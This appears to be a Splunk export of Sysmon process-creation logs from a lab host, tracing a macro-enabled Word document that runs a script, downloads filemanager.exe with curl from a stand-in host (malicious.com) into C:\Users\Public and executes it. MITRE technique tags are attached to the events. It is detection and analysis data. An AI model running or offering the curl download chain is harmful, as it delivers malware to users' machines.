{"preview":true,"result":{"CommandLine":"C:\\Windows\\system32\\cmd.exe /c C:\\script.cmd","Company":"Microsoft Corporation","ComputerName":"DESKTOP-3U2S6EJ","CurrentDirectory":"C:\\Users\\SLitt\\Desktop\\docs\\","Description":"Windows Command Processor","EventCode":"1","EventType":"4","FileVersion":"10.0.19041.746 (WinBuild.160101.0800)","Hashes":"SHA1=F1EFB0FDDC156E4C61C5F78A54700E4E7984D55D,MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18","Image":"C:\\Windows\\System32\\cmd.exe","IntegrityLevel":"Medium","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","LogonGuid":"{f589267d-9e72-6032-3707-030000000000}","LogonId":"0x30737","Message":"Process Create:\r\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\r\nUtcTime: 2021-02-21 19:41:58.273\r\nProcessGuid: {f589267d-b786-6032-1317-000000002a00}\r\nProcessId: 8712\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: C:\\Windows\\system32\\cmd.exe /c C:\\script.cmd\r\nCurrentDirectory: C:\\Users\\SLitt\\Desktop\\docs\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=F1EFB0FDDC156E4C61C5F78A54700E4E7984D55D,MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18\r\nParentProcessGuid: {f589267d-b786-6032-1217-000000002a00}\r\nParentProcessId: 1240\r\nParentImage: C:\\Users\\Public\\filemanager.exe\r\nParentCommandLine: C:\\\\Users\\\\Public\\\\filemanager.exe","OpCode":"Info","OriginalFileName":"Cmd.Exe","ParentCommandLine":"C:\\\\Users\\\\Public\\\\filemanager.exe","ParentImage":"C:\\Users\\Public\\filemanager.exe","ParentProcessGuid":"{f589267d-b786-6032-1217-000000002a00}","ParentProcessId":"1240","ProcessGuid":"{f589267d-b786-6032-1317-000000002a00}","ProcessId":"8712","Product":"Microsoft® Windows® Operating System","RecordNumber":"96126","RuleName":"technique_id=T1059.003,technique_name=Windows Command Shell","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TaskCategory":"Process Create (rule: ProcessCreate)","TerminalSessionId":"1","Type":"Information","User":["NOT_TRANSLATED","DESKTOP-3U2S6EJ\\SLitt"],"UtcTime":"2021-02-21 19:41:58.273","_raw":"02/21/2021 11:41:58 AM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=1\nEventType=4\nComputerName=DESKTOP-3U2S6EJ\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=96126\nKeywords=None\nTaskCategory=Process Create (rule: ProcessCreate)\nOpCode=Info\nMessage=Process Create:\r\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\r\nUtcTime: 2021-02-21 19:41:58.273\r\nProcessGuid: {f589267d-b786-6032-1317-000000002a00}\r\nProcessId: 8712\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: C:\\Windows\\system32\\cmd.exe /c C:\\script.cmd\r\nCurrentDirectory: C:\\Users\\SLitt\\Desktop\\docs\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=F1EFB0FDDC156E4C61C5F78A54700E4E7984D55D,MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18\r\nParentProcessGuid: {f589267d-b786-6032-1217-000000002a00}\r\nParentProcessId: 1240\r\nParentImage: C:\\Users\\Public\\filemanager.exe\r\nParentCommandLine: C:\\\\Users\\\\Public\\\\filemanager.exe","_time":"2021-02-21T11:41:58.000-0800","date_hour":"11","date_mday":"21","date_minute":"41","date_month":"february","date_second":"58","date_wday":"sunday","date_year":"2021","date_zone":"local","host":"DESKTOP-3U2S6EJ","index":"main","linecount":"37","punct":"//_::_=--/===-==---==--====__(:_)==_:\\r:_=.,=__\\r:_-","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational","splunk_server":"DESKTOP-3U2S6EJ","timeendpos":"23","timestartpos":"0"}}
{"preview":true,"result":{"CommandLine":"C:\\\\Users\\\\Public\\\\filemanager.exe","Company":"-","ComputerName":"DESKTOP-3U2S6EJ","CurrentDirectory":"C:\\Users\\SLitt\\Desktop\\docs\\","Description":"-","EventCode":"1","EventType":"4","FileVersion":"-","Hashes":"SHA1=85DD5FABDD7EFF31062F66D5F1BE1F4B6EDA0470,MD5=4C6A622EA6FD8571C55C7071965B836E,SHA256=D42974AB108A75E5CF71E1FE6E62C76ED3CB970486F32C0D7EAE54E0ACD93346,IMPHASH=E42CDB53F45F41A412F370ED95436A2A","Image":"C:\\Users\\Public\\filemanager.exe","IntegrityLevel":"Medium","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","LogonGuid":"{f589267d-9e72-6032-3707-030000000000}","LogonId":"0x30737","Message":"Process Create:\r\nRuleName: technique_id=T1036,technique_name=Masquerading\r\nUtcTime: 2021-02-21 19:41:58.230\r\nProcessGuid: {f589267d-b786-6032-1217-000000002a00}\r\nProcessId: 1240\r\nImage: C:\\Users\\Public\\filemanager.exe\r\nFileVersion: -\r\nDescription: -\r\nProduct: -\r\nCompany: -\r\nOriginalFileName: -\r\nCommandLine: C:\\\\Users\\\\Public\\\\filemanager.exe\r\nCurrentDirectory: C:\\Users\\SLitt\\Desktop\\docs\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=85DD5FABDD7EFF31062F66D5F1BE1F4B6EDA0470,MD5=4C6A622EA6FD8571C55C7071965B836E,SHA256=D42974AB108A75E5CF71E1FE6E62C76ED3CB970486F32C0D7EAE54E0ACD93346,IMPHASH=E42CDB53F45F41A412F370ED95436A2A\r\nParentProcessGuid: {f589267d-b785-6032-0f17-000000002a00}\r\nParentProcessId: 4460\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\getfilemanager.cmd","OpCode":"Info","OriginalFileName":"-","ParentCommandLine":"C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\getfilemanager.cmd","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{f589267d-b785-6032-0f17-000000002a00}","ParentProcessId":"4460","ProcessGuid":"{f589267d-b786-6032-1217-000000002a00}","ProcessId":"1240","Product":"-","RecordNumber":"96125","RuleName":"technique_id=T1036,technique_name=Masquerading","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TaskCategory":"Process Create (rule: ProcessCreate)","TerminalSessionId":"1","Type":"Information","User":["NOT_TRANSLATED","DESKTOP-3U2S6EJ\\SLitt"],"UtcTime":"2021-02-21 19:41:58.230","_raw":"02/21/2021 11:41:58 AM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=1\nEventType=4\nComputerName=DESKTOP-3U2S6EJ\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=96125\nKeywords=None\nTaskCategory=Process Create (rule: ProcessCreate)\nOpCode=Info\nMessage=Process Create:\r\nRuleName: technique_id=T1036,technique_name=Masquerading\r\nUtcTime: 2021-02-21 19:41:58.230\r\nProcessGuid: {f589267d-b786-6032-1217-000000002a00}\r\nProcessId: 1240\r\nImage: C:\\Users\\Public\\filemanager.exe\r\nFileVersion: -\r\nDescription: -\r\nProduct: -\r\nCompany: -\r\nOriginalFileName: -\r\nCommandLine: C:\\\\Users\\\\Public\\\\filemanager.exe\r\nCurrentDirectory: C:\\Users\\SLitt\\Desktop\\docs\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=85DD5FABDD7EFF31062F66D5F1BE1F4B6EDA0470,MD5=4C6A622EA6FD8571C55C7071965B836E,SHA256=D42974AB108A75E5CF71E1FE6E62C76ED3CB970486F32C0D7EAE54E0ACD93346,IMPHASH=E42CDB53F45F41A412F370ED95436A2A\r\nParentProcessGuid: {f589267d-b785-6032-0f17-000000002a00}\r\nParentProcessId: 4460\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\getfilemanager.cmd","_time":"2021-02-21T11:41:58.000-0800","date_hour":"11","date_mday":"21","date_minute":"41","date_month":"february","date_second":"58","date_wday":"sunday","date_year":"2021","date_zone":"local","host":"DESKTOP-3U2S6EJ","index":"main","linecount":"37","punct":"//_::_=--/===-==---==--====__(:_)==_:\\r:_=,=\\r:_--_:","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational","splunk_server":"DESKTOP-3U2S6EJ","timeendpos":"23","timestartpos":"0"}}
{"preview":true,"result":{"CommandLine":"curl  -o C:\\\\Users\\\\Public\\\\filemanager.exe http://malicious.com/filemanager.exe","Company":"curl, https://curl.haxx.se/","ComputerName":"DESKTOP-3U2S6EJ","CurrentDirectory":"C:\\Users\\SLitt\\Desktop\\docs\\","Description":"The curl executable","EventCode":"1","EventType":"4","FileVersion":"7.55.1","Hashes":"SHA1=086F74A35D5AFED78AE50CF5586FAFFFB7845464,MD5=1C3645EBDDBE2DA6A32A5F9FB43A3C23,SHA256=0BA1C44D0EE5B34B45B449074CDA51624150DC16B3B3C38251DF6C052ADBA205,IMPHASH=2447B641444AC52A5B600C8801CE3532","Image":"C:\\Windows\\System32\\curl.exe","IntegrityLevel":"Medium","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","LogonGuid":"{f589267d-9e72-6032-3707-030000000000}","LogonId":"0x30737","Message":"Process Create:\r\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\r\nUtcTime: 2021-02-21 19:41:58.094\r\nProcessGuid: {f589267d-b786-6032-1117-000000002a00}\r\nProcessId: 4288\r\nImage: C:\\Windows\\System32\\curl.exe\r\nFileVersion: 7.55.1\r\nDescription: The curl executable\r\nProduct: The curl executable\r\nCompany: curl, https://curl.haxx.se/\r\nOriginalFileName: curl.exe\r\nCommandLine: curl  -o C:\\\\Users\\\\Public\\\\filemanager.exe http://malicious.com/filemanager.exe \r\nCurrentDirectory: C:\\Users\\SLitt\\Desktop\\docs\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=086F74A35D5AFED78AE50CF5586FAFFFB7845464,MD5=1C3645EBDDBE2DA6A32A5F9FB43A3C23,SHA256=0BA1C44D0EE5B34B45B449074CDA51624150DC16B3B3C38251DF6C052ADBA205,IMPHASH=2447B641444AC52A5B600C8801CE3532\r\nParentProcessGuid: {f589267d-b785-6032-0f17-000000002a00}\r\nParentProcessId: 4460\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\getfilemanager.cmd","OpCode":"Info","OriginalFileName":"curl.exe","ParentCommandLine":"C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\getfilemanager.cmd","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{f589267d-b785-6032-0f17-000000002a00}","ParentProcessId":"4460","ProcessGuid":"{f589267d-b786-6032-1117-000000002a00}","ProcessId":"4288","Product":"The curl executable","RecordNumber":"96123","RuleName":"technique_id=T1059.003,technique_name=Windows Command Shell","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TaskCategory":"Process Create (rule: ProcessCreate)","TerminalSessionId":"1","Type":"Information","User":["NOT_TRANSLATED","DESKTOP-3U2S6EJ\\SLitt"],"UtcTime":"2021-02-21 19:41:58.094","_raw":"02/21/2021 11:41:58 AM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=1\nEventType=4\nComputerName=DESKTOP-3U2S6EJ\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=96123\nKeywords=None\nTaskCategory=Process Create (rule: ProcessCreate)\nOpCode=Info\nMessage=Process Create:\r\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\r\nUtcTime: 2021-02-21 19:41:58.094\r\nProcessGuid: {f589267d-b786-6032-1117-000000002a00}\r\nProcessId: 4288\r\nImage: C:\\Windows\\System32\\curl.exe\r\nFileVersion: 7.55.1\r\nDescription: The curl executable\r\nProduct: The curl executable\r\nCompany: curl, https://curl.haxx.se/\r\nOriginalFileName: curl.exe\r\nCommandLine: curl  -o C:\\\\Users\\\\Public\\\\filemanager.exe http://malicious.com/filemanager.exe \r\nCurrentDirectory: C:\\Users\\SLitt\\Desktop\\docs\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=086F74A35D5AFED78AE50CF5586FAFFFB7845464,MD5=1C3645EBDDBE2DA6A32A5F9FB43A3C23,SHA256=0BA1C44D0EE5B34B45B449074CDA51624150DC16B3B3C38251DF6C052ADBA205,IMPHASH=2447B641444AC52A5B600C8801CE3532\r\nParentProcessGuid: {f589267d-b785-6032-0f17-000000002a00}\r\nParentProcessId: 4460\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\getfilemanager.cmd","_time":"2021-02-21T11:41:58.000-0800","date_hour":"11","date_mday":"21","date_minute":"41","date_month":"february","date_second":"58","date_wday":"sunday","date_year":"2021","date_zone":"local","host":"DESKTOP-3U2S6EJ","index":"main","linecount":"37","punct":"//_::_=--/===-==---==--====__(:_)==_:\\r:_=.,=__\\r:_-","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational","splunk_server":"DESKTOP-3U2S6EJ","timeendpos":"23","timestartpos":"0"}}
{"preview":true,"result":{"CommandLine":"C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\getfilemanager.cmd","Company":"Microsoft Corporation","ComputerName":"DESKTOP-3U2S6EJ","CurrentDirectory":"C:\\Users\\SLitt\\Desktop\\docs\\","Description":"Windows Command Processor","EventCode":"1","EventType":"4","FileVersion":"10.0.19041.746 (WinBuild.160101.0800)","Hashes":"SHA1=F1EFB0FDDC156E4C61C5F78A54700E4E7984D55D,MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18","Image":"C:\\Windows\\System32\\cmd.exe","IntegrityLevel":"Medium","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","LogonGuid":"{f589267d-9e72-6032-3707-030000000000}","LogonId":"0x30737","Message":"Process Create:\r\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\r\nUtcTime: 2021-02-21 19:41:57.858\r\nProcessGuid: {f589267d-b785-6032-0f17-000000002a00}\r\nProcessId: 4460\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\getfilemanager.cmd\r\nCurrentDirectory: C:\\Users\\SLitt\\Desktop\\docs\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=F1EFB0FDDC156E4C61C5F78A54700E4E7984D55D,MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18\r\nParentProcessGuid: {f589267d-b784-6032-0d17-000000002a00}\r\nParentProcessId: 2344\r\nParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\r\nParentCommandLine: \"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\SLitt\\Desktop\\docs\\doc_curl.docm\" /o \"\"","OpCode":"Info","OriginalFileName":"Cmd.Exe","ParentCommandLine":"\"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\SLitt\\Desktop\\docs\\doc_curl.docm\" /o \"\"","ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","ParentProcessGuid":"{f589267d-b784-6032-0d17-000000002a00}","ParentProcessId":"2344","ProcessGuid":"{f589267d-b785-6032-0f17-000000002a00}","ProcessId":"4460","Product":"Microsoft® Windows® Operating System","RecordNumber":"96121","RuleName":"technique_id=T1059.003,technique_name=Windows Command Shell","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TaskCategory":"Process Create (rule: ProcessCreate)","TerminalSessionId":"1","Type":"Information","User":["NOT_TRANSLATED","DESKTOP-3U2S6EJ\\SLitt"],"UtcTime":"2021-02-21 19:41:57.858","_raw":"02/21/2021 11:41:57 AM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=1\nEventType=4\nComputerName=DESKTOP-3U2S6EJ\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=96121\nKeywords=None\nTaskCategory=Process Create (rule: ProcessCreate)\nOpCode=Info\nMessage=Process Create:\r\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\r\nUtcTime: 2021-02-21 19:41:57.858\r\nProcessGuid: {f589267d-b785-6032-0f17-000000002a00}\r\nProcessId: 4460\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\getfilemanager.cmd\r\nCurrentDirectory: C:\\Users\\SLitt\\Desktop\\docs\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=F1EFB0FDDC156E4C61C5F78A54700E4E7984D55D,MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18\r\nParentProcessGuid: {f589267d-b784-6032-0d17-000000002a00}\r\nParentProcessId: 2344\r\nParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\r\nParentCommandLine: \"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\SLitt\\Desktop\\docs\\doc_curl.docm\" /o \"\"","_time":"2021-02-21T11:41:57.000-0800","date_hour":"11","date_mday":"21","date_minute":"41","date_month":"february","date_second":"57","date_wday":"sunday","date_year":"2021","date_zone":"local","host":"DESKTOP-3U2S6EJ","index":"main","linecount":"37","punct":"//_::_=--/===-==---==--====__(:_)==_:\\r:_=.,=__\\r:_-","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational","splunk_server":"DESKTOP-3U2S6EJ","timeendpos":"23","timestartpos":"0"}}
{"preview":true,"result":{"CommandLine":"C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding","Company":"Microsoft Corporation","ComputerName":"DESKTOP-3U2S6EJ","CurrentDirectory":"C:\\Windows\\system32\\","Description":"WMI Provider Host","EventCode":"1","EventType":"4","FileVersion":"10.0.19041.546 (WinBuild.160101.0800)","Hashes":"SHA1=3EA7CC066317AC45F963C2227C4C7C50AA16EB7C,MD5=60FF40CFD7FB8FE41EE4FE9AE5FE1C51,SHA256=2198A7B58BCCB758036B969DDAE6CC2ECE07565E2659A7C541A313A0492231A3,IMPHASH=B71CB3AC5C352BEC857C940CBC95F0F3","Image":"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe","IntegrityLevel":"System","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","LogonGuid":"{f589267d-9e6f-6032-e403-000000000000}","LogonId":"0x3E4","Message":"Process Create:\r\nRuleName: technique_id=T1047,technique_name=Windows Management Instrumentation\r\nUtcTime: 2021-02-21 19:41:57.051\r\nProcessGuid: {f589267d-b785-6032-0e17-000000002a00}\r\nProcessId: 4000\r\nImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\r\nFileVersion: 10.0.19041.546 (WinBuild.160101.0800)\r\nDescription: WMI Provider Host\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Wmiprvse.exe\r\nCommandLine: C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: NT AUTHORITY\\NETWORK SERVICE\r\nLogonGuid: {f589267d-9e6f-6032-e403-000000000000}\r\nLogonId: 0x3E4\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: SHA1=3EA7CC066317AC45F963C2227C4C7C50AA16EB7C,MD5=60FF40CFD7FB8FE41EE4FE9AE5FE1C51,SHA256=2198A7B58BCCB758036B969DDAE6CC2ECE07565E2659A7C541A313A0492231A3,IMPHASH=B71CB3AC5C352BEC857C940CBC95F0F3\r\nParentProcessGuid: {f589267d-9e6f-6032-0d00-000000002a00}\r\nParentProcessId: 872\r\nParentImage: C:\\Windows\\System32\\svchost.exe\r\nParentCommandLine: C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p","OpCode":"Info","OriginalFileName":"Wmiprvse.exe","ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p","ParentImage":"C:\\Windows\\System32\\svchost.exe","ParentProcessGuid":"{f589267d-9e6f-6032-0d00-000000002a00}","ParentProcessId":"872","ProcessGuid":"{f589267d-b785-6032-0e17-000000002a00}","ProcessId":"4000","Product":"Microsoft® Windows® Operating System","RecordNumber":"96110","RuleName":"technique_id=T1047,technique_name=Windows Management Instrumentation","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TaskCategory":"Process Create (rule: ProcessCreate)","TerminalSessionId":"0","Type":"Information","User":["NOT_TRANSLATED","NT AUTHORITY\\NETWORK SERVICE"],"UtcTime":"2021-02-21 19:41:57.051","_raw":"02/21/2021 11:41:57 AM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=1\nEventType=4\nComputerName=DESKTOP-3U2S6EJ\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=96110\nKeywords=None\nTaskCategory=Process Create (rule: ProcessCreate)\nOpCode=Info\nMessage=Process Create:\r\nRuleName: technique_id=T1047,technique_name=Windows Management Instrumentation\r\nUtcTime: 2021-02-21 19:41:57.051\r\nProcessGuid: {f589267d-b785-6032-0e17-000000002a00}\r\nProcessId: 4000\r\nImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\r\nFileVersion: 10.0.19041.546 (WinBuild.160101.0800)\r\nDescription: WMI Provider Host\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Wmiprvse.exe\r\nCommandLine: C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: NT AUTHORITY\\NETWORK SERVICE\r\nLogonGuid: {f589267d-9e6f-6032-e403-000000000000}\r\nLogonId: 0x3E4\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: SHA1=3EA7CC066317AC45F963C2227C4C7C50AA16EB7C,MD5=60FF40CFD7FB8FE41EE4FE9AE5FE1C51,SHA256=2198A7B58BCCB758036B969DDAE6CC2ECE07565E2659A7C541A313A0492231A3,IMPHASH=B71CB3AC5C352BEC857C940CBC95F0F3\r\nParentProcessGuid: {f589267d-9e6f-6032-0d00-000000002a00}\r\nParentProcessId: 872\r\nParentImage: C:\\Windows\\System32\\svchost.exe\r\nParentCommandLine: C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p","_time":"2021-02-21T11:41:57.000-0800","date_hour":"11","date_mday":"21","date_minute":"41","date_month":"february","date_second":"57","date_wday":"sunday","date_year":"2021","date_zone":"local","host":"DESKTOP-3U2S6EJ","index":"main","linecount":"37","punct":"//_::_=--/===-==---==--====__(:_)==_:\\r:_=,=__\\r:_--","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational","splunk_server":"DESKTOP-3U2S6EJ","timeendpos":"23","timestartpos":"0"}}
{"preview":true,"result":{"CommandLine":"\"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\SLitt\\Desktop\\docs\\doc_curl.docm\" /o \"\"","Company":"Microsoft Corporation","ComputerName":"DESKTOP-3U2S6EJ","CurrentDirectory":"C:\\Users\\SLitt\\Desktop\\docs\\","Description":"Microsoft Word","EventCode":"1","EventType":"4","FileVersion":"16.0.13801.20160","Hashes":"SHA1=34FEDBE8BC105D887CD0A9806F22DA00B0D3A126,MD5=581D3C8191F703E7A10D833E5E11E42A,SHA256=7B365B3870A63AE247D22F599F178636F808388C4E43E2A3426545A86406C76D,IMPHASH=7F3EEE6930E62160D8989EDC51550522","Image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","IntegrityLevel":"Medium","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","LogonGuid":"{f589267d-9e72-6032-3707-030000000000}","LogonId":"0x30737","Message":"Process Create:\r\nRuleName: technique_id=T1204,technique_name=User Execution\r\nUtcTime: 2021-02-21 19:41:56.542\r\nProcessGuid: {f589267d-b784-6032-0d17-000000002a00}\r\nProcessId: 2344\r\nImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\r\nFileVersion: 16.0.13801.20160\r\nDescription: Microsoft Word\r\nProduct: Microsoft Office\r\nCompany: Microsoft Corporation\r\nOriginalFileName: WinWord.exe\r\nCommandLine: \"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\SLitt\\Desktop\\docs\\doc_curl.docm\" /o \"\"\r\nCurrentDirectory: C:\\Users\\SLitt\\Desktop\\docs\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=34FEDBE8BC105D887CD0A9806F22DA00B0D3A126,MD5=581D3C8191F703E7A10D833E5E11E42A,SHA256=7B365B3870A63AE247D22F599F178636F808388C4E43E2A3426545A86406C76D,IMPHASH=7F3EEE6930E62160D8989EDC51550522\r\nParentProcessGuid: {f589267d-9e74-6032-8100-000000002a00}\r\nParentProcessId: 5560\r\nParentImage: C:\\Windows\\explorer.exe\r\nParentCommandLine: C:\\Windows\\Explorer.EXE","OpCode":"Info","OriginalFileName":"WinWord.exe","ParentCommandLine":"C:\\Windows\\Explorer.EXE","ParentImage":"C:\\Windows\\explorer.exe","ParentProcessGuid":"{f589267d-9e74-6032-8100-000000002a00}","ParentProcessId":"5560","ProcessGuid":"{f589267d-b784-6032-0d17-000000002a00}","ProcessId":"2344","Product":"Microsoft Office","RecordNumber":"96108","RuleName":"technique_id=T1204,technique_name=User 